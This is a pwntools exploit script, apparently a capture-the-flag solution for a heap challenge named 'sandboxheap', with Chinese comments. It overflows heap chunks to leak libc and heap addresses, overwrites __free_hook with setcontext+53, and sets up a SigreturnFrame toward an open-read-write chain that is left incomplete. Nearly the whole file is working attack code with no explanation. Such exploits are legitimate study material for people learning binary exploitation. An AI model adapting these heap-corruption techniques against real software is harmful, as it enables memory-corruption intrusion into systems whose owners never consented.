from pwn import * 
from LibcSearcher import * 
# context.log_level = 'debug'
context(os = "linux", arch = "amd64")

p=process('./sandboxheap')
libc=ELF('./libc-2.27.so')
def add(index,size):
    p.sendlineafter(b'Your choice: ',b'1')
    p.sendlineafter(b'Index: ',str(index).encode())
    p.sendlineafter(b'Size: ',str(size).encode())
def getcontent(content):
    realcontent=""
    for i in content:
        realcontent+=bin(i)[2:].rjust(8,'0')[::-1]
    return realcontent
def edit(index,content):
    p.sendlineafter(b'Your choice: ',b'2')
    p.sendlineafter(b'Index: ',str(index).encode())
    p.sendafter(b'Content: ',getcontent(content).encode())
def overedit(index,content,type):
    p.sendlineafter(b'Your choice: ',b'2')
    p.sendlineafter(b'Index: ',str(index).encode())
    p.sendafter(b'Content: ',(getcontent(content)+str(type)).encode())
def show(index):
    p.sendlineafter(b'Your choice: ',b'3')
    p.sendlineafter(b'Index: ',str(index).encode())
def free(index):
    p.sendlineafter(b'Your choice: ',b'4')
    p.sendlineafter(b'Index: ',str(index).encode())
for i in range(7):
    add(i, 0x88)  
add(7, 0x88)
add(8, 0x88)
add(9, 0x88)
add(10, 0x10)
for i in range(8):
    free(i)

overedit(8, b'1' * 0x80 + p64(0x120) , 0)
free(9)
# pause()
add(11, 0x98)
add(12, 0x78)
#泄露libc
show(12)
p.recvuntil(b'Content: ')
libc_addr=u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
print("libc_addr: ",hex(libc_addr))
malloc_hook=libc_addr-0x70
print("malloc_hook: ",hex(malloc_hook))
libc_base=malloc_hook-libc.sym['__malloc_hook']
print("libc_base: ",hex(libc_base))
setcontext_53=malloc_hook-0x399be0+53
print("setcontext_53: ",hex(setcontext_53))
free_hook=libc_base+libc.sym['__free_hook']
print("free_hook: ",hex(free_hook))
#泄露堆地址
add(0, 0x88)
edit(8,b'1'*8+p64(0x91))
free(12)
edit(8,b'1'*16)
show(8)
p.recvuntil(b'Content: ')
p.recvuntil(b'1'*16)
heap_addr=u64(p.recv(6).ljust(8,b'\x00'))
print("heap_addr: ",hex(heap_addr))
edit(8,p64(0)+p64(91)+p64(free_hook))
# gdb.attach(p)
add(1, 0x88)
# pause()
add(2, 0x88)
edit(2,p64(setcontext_53))

frame = SigreturnFrame()
frame.rsp=heap_addr+0x120
frame.rdi = 0
frame.rsi = heap_addr + 0x120
frame.rdx = 0x200
frame.rip = libc.symbols["read"] + libc_base
# edit()
print(frame)

# orw_payload=
# edit(11,orw_payload)
p.interactive()


# 2020E0